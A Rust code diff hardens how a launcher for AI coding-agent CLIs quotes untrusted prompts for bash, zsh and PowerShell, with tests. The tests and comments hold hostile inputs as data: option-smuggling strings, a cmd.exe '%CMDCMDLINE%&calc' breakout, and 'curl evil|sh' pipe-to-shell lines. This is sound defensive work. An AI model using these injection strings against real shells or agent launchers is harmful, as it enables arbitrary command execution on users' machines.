@@ -320,48 +320,230 @@ pub fn shell_escape_for_double_quotes(s: &str) -> String {
 /// Escape a string for safe embedding in `$'...'` (ANSI-C quoted) shell arguments.
 /// Unlike double-quote escaping, `$'...'` interprets `\n` as a real newline,
 /// so multi-line prompts are preserved correctly.
+///
+/// The command is typed into an interactive shell as keystrokes, so the
+/// result is printable ASCII only: a raw control byte (^U, ^O, ESC, ...) would
+/// act as a line-editing key before the quote is ever parsed. Every other byte,
+/// UTF-8 included, becomes `\xHH`, which bash and zsh decode back to the same
+/// bytes. `'` is written as `\x27` so the body never contains a quote and
+/// cannot end the quoted argument in any shell, and `!` as `\x21` so bash
+/// history expansion cannot splice in other text. `$`, `` ` ``, `(` and `)`
+/// are escaped too: nushell reads `$'...'` as an interpolated string that
+/// runs `(...)` subexpressions, and leaves `\x28` as plain text. NUL cannot
+/// reach argv and is dropped.
+///
+/// Only bash and zsh decode the escapes. In other `$SHELL`s the agent gets
+/// the escaped text, or the line fails to parse (fish rejects `$'`), but the
+/// body has nothing left to break out with.
 pub fn shell_escape_for_ansi_c_quotes(s: &str) -> String {
-    s.replace('\\', "\\\\")
-        .replace('\'', "\\'")
-        .replace('\n', "\\n")
-        .replace('\r', "\\r")
+    use std::fmt::Write as _;
+    let mut out = String::with_capacity(s.len());
+    for byte in s.bytes() {
+        match byte {
+            b'\\' => out.push_str("\\\\"),
+            b'\n' => out.push_str("\\n"),
+            b'\r' => out.push_str("\\r"),
+            b'\t' => out.push_str("\\t"),
+            0 => {}
+            b'\'' | b'!' | b'$' | b'`' | b'(' | b')' => {
+                let _ = write!(out, "\\x{byte:02X}");
+            }
+            0x20..=0x7e => out.push(byte as char),
+            _ => {
+                let _ = write!(out, "\\x{byte:02X}");
+            }
+        }
+    }
+    out
+}
+
+/// Quote a string as one PowerShell argument typed into an interactive
+/// PowerShell. Single quotes are literal (no `$` or backtick expansion);
+/// PowerShell treats the typographic single quotes as quotes too, so each of
+/// them is doubled like `'`. Control characters would act as editing keys
+/// (Tab completes, ^C cancels), so line breaks become spaces and the rest are
+/// dropped.
+///
+/// Parsing is only half of it. Windows PowerShell 5.1 (and pwsh's legacy
+/// native-argument mode, which it still uses for `.cmd`/`.bat` shims) builds
+/// the child's command line by wrapping an argument that has whitespace in
+/// `"..."` without escaping what is inside. So the value itself must hold no
+/// double quote: every double-quote character becomes `'` (a `"` would end
+/// the wrapped argument and let the rest of the prompt add argv such as
+/// `--mcp-config`). It must not end in a backslash either (`\"` would escape
+/// the closing quote), and it always holds a space so it is always wrapped:
+/// an unwrapped `a&calc` would let cmd.exe run `calc` through a `.cmd` shim.
+/// A trailing space covers both.
+///
+/// Quoting can't stop cmd.exe's variable expansion, which runs before it
+/// looks at quotes: `%CMDCMDLINE:~-1%` expands to the `"` PowerShell closed
+/// the argument with, so `&calc` after it would run. `!VAR!` does the same
+/// when delayed expansion is on. So `%` and `!` become their fullwidth forms
+/// (cmd.exe parses UTF-16 and only matches the ASCII ones), which also keeps
+/// text like `%USERPROFILE%` from being rewritten.
+pub fn shell_quote_for_powershell(s: &str) -> String {
+    let mut body = String::with_capacity(s.len() + 1);
+    for c in s.replace("\r\n", "\n").chars() {
+        match c {
+            // Typographic and fullwidth forms too: Windows' best-fit mapping
+            // turns them into `"` for programs that read an ANSI command line.
+            '"' | '\u{201C}' | '\u{201D}' | '\u{201E}' | '\u{201F}' | '\u{FF02}' => body.push('\''),
+            '%' => body.push('\u{FF05}'),
+            '!' => body.push('\u{FF01}'),
+            '\n' | '\r' | '\t' => body.push(' '),
+            c if c.is_control() => {}
+            c => body.push(c),
+        }
+    }
+    // Control bytes above may have been removed before a leading option.
+    guard_leading_option(&mut body);
+    if body.ends_with('\\') || !body.contains(' ') {
+        body.push(' ');
+    }
+    let mut out = String::with_capacity(body.len() + 2);
+    out.push('\'');
+    for c in body.chars() {
+        if matches!(c, '\'' | '\u{2018}' | '\u{2019}' | '\u{201A}' | '\u{201B}') {
+            out.push(c);
+        }
+        out.push(c);
+    }
+    out.push('\'');
+    out
+}
+
+fn guard_leading_option(prompt: &mut String) {
+    if prompt.starts_with('-') {
+        prompt.insert(0, ' ');
+    }
+}
+
+/// The prompt as one argument for `shell` (the shell the agent command is
+/// typed into), or None when that shell can't take it safely: `$'...'` is
+/// only decoded by bash and zsh, fish rejects it, and cmd.exe expands
+/// `%VAR%` and runs `&`/`|` with no literal quoting.
+fn quote_prompt_argument(prompt: &str, shell: &str) -> Option<String> {
+    let name = shell.rsplit(['/', '\\']).next().unwrap_or(shell).to_ascii_lowercase();
+    match name.strip_suffix(".exe").unwrap_or(&name) {
+        "bash" | "zsh" => {
+            // ANSI-C quoting drops NUL, which cannot reach argv. Guard the
+            // resulting value, since NUL may have preceded an option.
+            let mut normalized = prompt.replace('\0', "");
+            guard_leading_option(&mut normalized);
+            Some(format!("$'{}'", shell_escape_for_ansi_c_quotes(&normalized)))
+        }
+        "pwsh" | "powershell" => Some(shell_quote_for_powershell(prompt)),
+        _ => None,
+    }
+}
+
+/// The flag that passes an initial prompt to an interactive session of a
+/// builtin agent CLI (`""` for a positional prompt), checked against each
+/// CLI's `--help`. None means the CLI has no such flag and the user must
+/// enter the prompt in its TUI after it starts.
+fn interactive_prompt_flag(preset_id: &str) -> Option<&'static str> {
+    match preset_id {
+        "builtin-claude" | "builtin-codex" | "builtin-cursor-agent" | "builtin-grok" => Some(""),
+        "builtin-gemini" | "builtin-antigravity" | "builtin-copilot" => Some("-i "),
+        "builtin-opencode" => Some("--prompt "),
+        _ => None,
+    }
 }
 
 /// Build the agent launch command, optionally embedding the prompt.
-/// Returns (command, needs_pty_injection).
-/// If needs_pty_injection is true, the prompt should be written to PTY after agent startup.
+/// Returns (command, prompt_requires_manual_entry).
+///
+/// Embedding is preferred: the prompt stays one quoted argument and never
+/// reaches a line editor as keystrokes. For CLIs without a prompt flag and
+/// shells that cannot be quoted safely, the user enters it in the agent.
+/// `shell` must describe the receiving session, not the desktop's default.
+/// Pass None when the receiving shell is unknown.
 pub fn prepare_agent_command(
     preset_id: &str,
     base_command: &str,
     initial_prompt: Option<&str>,
+    shell: Option<&str>,
+) -> (String, bool) {
+    match shell {
+        Some(shell) => {
+            prepare_agent_command_for_shell(preset_id, base_command, initial_prompt, shell)
+        }
+        None => (
+            base_command.to_string(),
+            initial_prompt.is_some_and(|prompt| !prompt.trim().is_empty()),
+        ),
+    }
+}
+
+fn prepare_agent_command_for_shell(
+    preset_id: &str,
+    base_command: &str,
+    initial_prompt: Option<&str>,
+    shell: &str,
 ) -> (String, bool) {
     let prompt = match initial_prompt {
         Some(p) if !p.trim().is_empty() => p,
         _ => return (base_command.to_string(), false),
     };
-
-    let escaped = shell_escape_for_ansi_c_quotes(prompt);
-
-    match preset_id {
-        "builtin-claude" => {
-            // Claude CLI: append prompt as ANSI-C quoted argument (preserves newlines)
-            (format!("{base_command} $'{escaped}'"), false)
-        }
-        "builtin-codex" => {
-            // Codex: prompt as positional argument
-            (format!("{base_command} $'{escaped}'"), false)
-        }
-        _ => {
-            // Gemini, Antigravity, Copilot, Cursor Agent, Amp, Grok,
-            // Droid, OpenCode, custom: inject prompt via PTY after startup
-            (base_command.to_string(), true)
-        }
+    match interactive_prompt_flag(preset_id).zip(quote_prompt_argument(prompt, shell)) {
+        Some((flag, quoted)) => (format!("{base_command} {flag}{quoted}"), false),
+        None => (base_command.to_string(), true),
     }
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn a_prompt_starting_with_a_dash_never_becomes_an_option() {
+        let (cmd, typed) = prepare_agent_command_for_shell(
+            "builtin-claude",
+            "claude",
+            Some("--mcp-config x"),
+            "/bin/bash",
+        );
+        assert!(!typed);
+        assert_eq!(cmd, "claude $' --mcp-config x'");
+        let (cmd, _) = prepare_agent_command_for_shell(
+            "builtin-claude",
+            "claude",
+            Some("-p"),
+            "pwsh",
+        );
+        assert_eq!(cmd, "claude ' -p'");
+
+        // Both encoders remove controls before the CLI sees the value. A
+        // dash that becomes first only after that removal is still guarded.
+        let (cmd, withheld) = prepare_agent_command_for_shell(
+            "builtin-claude",
+            "claude",
+            Some("\0--mcp-config x"),
+            "/bin/bash",
+        );
+        assert!(!withheld);
+        assert_eq!(cmd, "claude $' --mcp-config x'");
+        let (cmd, withheld) = prepare_agent_command_for_shell(
+            "builtin-claude",
+            "claude",
+            Some("\x01--mcp-config x"),
+            "pwsh",
+        );
+        assert!(!withheld);
+        assert_eq!(cmd, "claude ' --mcp-config x'");
+    }
+
+    #[test]
+    fn unknown_receiving_shell_requires_manual_prompt_entry() {
+        assert_eq!(
+            prepare_agent_command("builtin-claude", "claude", Some("fix it"), None),
+            ("claude".to_string(), true)
+        );
+        assert_eq!(
+            prepare_agent_command("builtin-claude", "claude", None, None),
+            ("claude".to_string(), false)
+        );
+    }
 
     #[test]
     fn sanitize_basic() {
@@ -473,10 +655,11 @@ mod tests {
 
     #[test]
     fn prepare_claude_with_prompt() {
-        let (cmd, via_pty) = prepare_agent_command(
+        let (cmd, via_pty) = prepare_agent_command_for_shell(
             "builtin-claude",
             "claude --dangerously-skip-permissions",
             Some("fix the login bug"),
+            "/bin/bash",
         );
         assert!(cmd.contains("fix the login bug"));
         assert!(cmd.contains("$'"));
@@ -485,10 +668,11 @@ mod tests {
 
     #[test]
     fn prepare_claude_with_multiline_prompt() {
-        let (cmd, via_pty) = prepare_agent_command(
+        let (cmd, via_pty) = prepare_agent_command_for_shell(
             "builtin-claude",
             "claude --dangerously-skip-permissions",
             Some("Issue #42: broken\nStatus: Open\n\n---\nFix it"),
+            "/usr/bin/zsh",
         );
         // Uses $'...' ANSI-C quoting so bash interprets \n as real newlines
         assert!(cmd.starts_with("claude --dangerously-skip-permissions $'"));
@@ -497,23 +681,150 @@ mod tests {
         assert!(!via_pty);
     }
 
+    /// CLIs with an interactive prompt flag get the prompt as one quoted
+    /// argument; the rest ask the user to enter it in their TUI.
     #[test]
-    fn prepare_gemini_via_pty() {
-        let (cmd, via_pty) = prepare_agent_command(
-            "builtin-gemini",
-            "gemini --yolo",
-            Some("fix the login bug"),
+    fn prepare_embeds_prompt_for_clis_with_a_prompt_flag() {
+        let cases = [
+            ("builtin-claude", "claude", "claude $'it\\x27s'"),
+            ("builtin-codex", "codex", "codex $'it\\x27s'"),
+            ("builtin-gemini", "gemini --yolo", "gemini --yolo -i $'it\\x27s'"),
+            ("builtin-antigravity", "agy", "agy -i $'it\\x27s'"),
+            ("builtin-copilot", "copilot --allow-all", "copilot --allow-all -i $'it\\x27s'"),
+            ("builtin-opencode", "opencode", "opencode --prompt $'it\\x27s'"),
+            ("builtin-cursor-agent", "cursor-agent --yolo", "cursor-agent --yolo $'it\\x27s'"),
+            ("builtin-grok", "grok", "grok $'it\\x27s'"),
+        ];
+        for (preset, base, expected) in cases {
+            let (cmd, via_pty) =
+                prepare_agent_command_for_shell(preset, base, Some("it's"), "/bin/bash");
+            assert_eq!(cmd, expected, "{preset}");
+            assert!(!via_pty, "{preset}");
+        }
+        for preset in ["builtin-amp", "builtin-droid", "builtin-pi", "builtin-mastracode", "custom-1"] {
+            let (cmd, via_pty) =
+                prepare_agent_command_for_shell(preset, "agent", Some("it's"), "/bin/bash");
+            assert_eq!(cmd, "agent", "{preset}");
+            assert!(via_pty, "{preset}");
+        }
+    }
+
+    /// Only bash and zsh decode `$'...'`; PowerShell gets its own quoting;
+    /// any other shell requires manual prompt entry in the agent.
+    #[test]
+    fn prepare_quotes_the_prompt_for_the_users_shell() {
+        let prompt = "it's $HOME\n\x1b[201~\x15x";
+        let quoted = |shell: &str| {
+            prepare_agent_command_for_shell("builtin-gemini", "gemini", Some(prompt), shell)
+        };
+        assert!(quoted("/usr/bin/zsh").0.starts_with("gemini -i $'"));
+        assert_eq!(
+            quoted(r"C:\Program Files\PowerShell\7\pwsh.exe"),
+            ("gemini -i 'it''s $HOME [201~x'".to_string(), false)
         );
-        assert_eq!(cmd, "gemini --yolo");
-        assert!(via_pty);
+        assert!(quoted(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe").0.contains("'it''s"));
+        for shell in ["/usr/bin/fish", "/usr/bin/nu", "/bin/sh", r"C:\Windows\System32\cmd.exe"] {
+            assert_eq!(quoted(shell), ("gemini".to_string(), true), "{shell}");
+        }
+    }
+
+    /// PowerShell single quotes are literal; every quote character (ASCII and
+    /// typographic) is doubled and control characters never reach the line.
+    #[test]
+    fn powershell_quote_doubles_quotes_and_drops_controls() {
+        assert_eq!(
+            shell_quote_for_powershell("a'b\u{2019}c\r\nd\te\x03\x1b[31m$(id)`x"),
+            "'a''b\u{2019}\u{2019}c d e[31m$(id)`x'"
+        );
+    }
+
+    /// Windows PowerShell wraps a native argument in `"..."` without escaping
+    /// it, so a `"` in the prompt would end the argument and add argv (and a
+    /// trailing `\` would escape the closing quote). The quoted value holds
+    /// no double-quote character, never ends in a backslash, and always has a
+    /// space so it is always wrapped.
+    #[test]
+    fn powershell_quote_leaves_no_double_quote_or_trailing_backslash() {
+        let inner = |quoted: &str| -> String {
+            let body = quoted
+                .strip_prefix('\'')
+                .and_then(|rest| rest.strip_suffix('\''))
+                .expect("one single-quoted argument");
+            body.replace("''", "'")
+        };
+        for prompt in [
+            r#"fix" --mcp-config "C:\evil.json"#,
+            "fix \u{201C}it\u{201D} \u{FF02}now\u{201E}\u{201F}",
+            r#"path C:\dir\\"#,
+            r#"end\"#,
+            "a&calc",
+        ] {
+            let quoted = shell_quote_for_powershell(prompt);
+            let value = inner(&quoted);
+            for c in ['"', '\u{201C}', '\u{201D}', '\u{201E}', '\u{201F}', '\u{FF02}'] {
+                assert!(!value.contains(c), "{c:?} in {quoted:?}");
+            }
+            assert!(!value.ends_with('\\'), "trailing backslash in {quoted:?}");
+            assert!(value.contains(' '), "unwrapped argument {quoted:?}");
+        }
+        assert_eq!(
+            shell_quote_for_powershell(r#"fix" --mcp-config "x"#),
+            "'fix'' --mcp-config ''x'"
+        );
+        assert_eq!(shell_quote_for_powershell(r"end\"), r"'end\ '");
+    }
+
+    /// cmd.exe expands `%VAR%` (and `!VAR!` with delayed expansion) before it
+    /// tracks quotes, so `%CMDCMDLINE:~-1%` would become a `"` that ends the
+    /// argument and runs `&calc` through a `.cmd` shim. The quoted value holds
+    /// no `%` or `!` at all.
+    #[test]
+    fn powershell_quote_leaves_no_cmd_expansion_characters() {
+        for prompt in [
+            "x %CMDCMDLINE:~-1%&calc",
+            "x !CMDCMDLINE:~-1!&calc",
+            "raise coverage to 80% in %USERPROFILE%\\src!",
+        ] {
+            let quoted = shell_quote_for_powershell(prompt);
+            for c in ['%', '!'] {
+                assert!(!quoted.contains(c), "{c:?} in {quoted:?}");
+            }
+        }
+        assert_eq!(
+            shell_quote_for_powershell("x %CMDCMDLINE:~-1%&calc"),
+            "'x \u{FF05}CMDCMDLINE:~-1\u{FF05}&calc'"
+        );
+        let (cmd, via_pty) = prepare_agent_command_for_shell(
+            "builtin-claude",
+            "claude.cmd",
+            Some("x %CMDCMDLINE:~-1%&calc"),
+            r"C:\Program Files\PowerShell\7\pwsh.exe",
+        );
+        assert!(!via_pty);
+        assert!(!cmd.contains('%'), "{cmd:?}");
+    }
+
+    /// Nushell reads `$'...'` as an interpolated string and runs `(...)`, so
+    /// the body carries no `(`, `)`, `$` or backtick.
+    #[test]
+    fn ansi_c_escape_leaves_no_interpolation_characters() {
+        let escaped = shell_escape_for_ansi_c_quotes("(^curl https://x | ^sh) $HOME `id`");
+        for c in ['(', ')', '$', '`'] {
+            assert!(!escaped.contains(c), "{c} in {escaped:?}");
+        }
+        assert_eq!(
+            escaped,
+            "\\x28^curl https://x | ^sh\\x29 \\x24HOME \\x60id\\x60"
+        );
     }
 
     #[test]
     fn prepare_no_prompt_no_change() {
-        let (cmd, via_pty) = prepare_agent_command(
+        let (cmd, via_pty) = prepare_agent_command_for_shell(
             "builtin-claude",
             "claude --dangerously-skip-permissions",
             None,
+            "/bin/bash",
         );
         assert_eq!(cmd, "claude --dangerously-skip-permissions");
         assert!(!via_pty);
@@ -555,8 +866,52 @@ mod tests {
     fn ansi_c_escape_single_quotes() {
         assert_eq!(
             shell_escape_for_ansi_c_quotes("it's a test"),
-            "it\\'s a test"
+            "it\\x27s a test"
         );
+    }
+
+    /// Prompt text from PR comments, CI logs and issues is untrusted. Raw
+    /// ^U/^O/ESC/^C bytes would edit and run the typed shell line, so the
+    /// launch command must be printable ASCII with no bare quote.
+    #[test]
+    fn prepare_claude_escapes_control_bytes() {
+        let prompt = "log\x15curl evil|sh\x0f\x1b[201~\x03\x04\x7f it's \u{9b}é 🚀!!";
+        for preset in ["builtin-claude", "builtin-codex"] {
+            let (cmd, via_pty) = prepare_agent_command_for_shell(preset, "claude", Some(prompt), "/bin/bash");
+            assert!(!via_pty);
+            let body = cmd
+                .strip_prefix("claude $'")
+                .and_then(|rest| rest.strip_suffix('\''))
+                .expect("prompt is one ANSI-C quoted argument");
+            assert!(
+                body.bytes().all(|b| (0x20..=0x7e).contains(&b)),
+                "non-printable byte typed into the shell: {body:?}"
+            );
+            assert!(!body.contains('\''), "bare quote in {body:?}");
+            assert!(!body.contains('!'), "history expansion char in {body:?}");
+            assert!(body.contains("log\\x15curl evil|sh\\x0F\\x1B[201~\\x03\\x04\\x7F"));
+        }
+    }
+
+    /// The escaped argument must decode back to the original prompt in every
+    /// shell that supports `$'...'`. Shells missing from PATH are skipped.
+    #[cfg(unix)]
+    #[test]
+    fn ansi_c_escape_round_trips_through_bash_and_zsh() {
+        let prompt = "a\x15b\x0fc\x1b[31md\x03\te\x7ff\r\ng'h\\i!!j $HOME `id` $(id) (x) é 🚀\u{9b}";
+        let script = format!("printf '%s' $'{}'", shell_escape_for_ansi_c_quotes(prompt));
+        for (shell, args) in [("bash", ["--norc", "--noprofile"]), ("zsh", ["-f", "-d"])] {
+            let Ok(path) = which::which(shell) else {
+                continue;
+            };
+            let out = std::process::Command::new(path)
+                .args(args)
+                .args(["-c", &script])
+                .output()
+                .expect("run shell");
+            assert!(out.status.success(), "{shell}: {}", String::from_utf8_lossy(&out.stderr));
+            assert_eq!(String::from_utf8(out.stdout).unwrap(), prompt, "{shell}");
+        }
     }
 
     #[test]
@@ -568,11 +923,12 @@ mod tests {
     }
 
     #[test]
-    fn ansi_c_escape_preserves_dollar_and_backtick() {
-        // $'...' does not expand $vars or `backticks`, so they need no escaping
+    fn ansi_c_escape_hex_encodes_dollar_and_backtick() {
+        // bash and zsh decode these back to a literal `$` and backtick (see
+        // the round-trip test); the hex form keeps nushell from interpolating.
         assert_eq!(
             shell_escape_for_ansi_c_quotes("use $HOME and `cmd`"),
-            "use $HOME and `cmd`"
+            "use \\x24HOME and \\x60cmd\\x60"
         );
     }
 
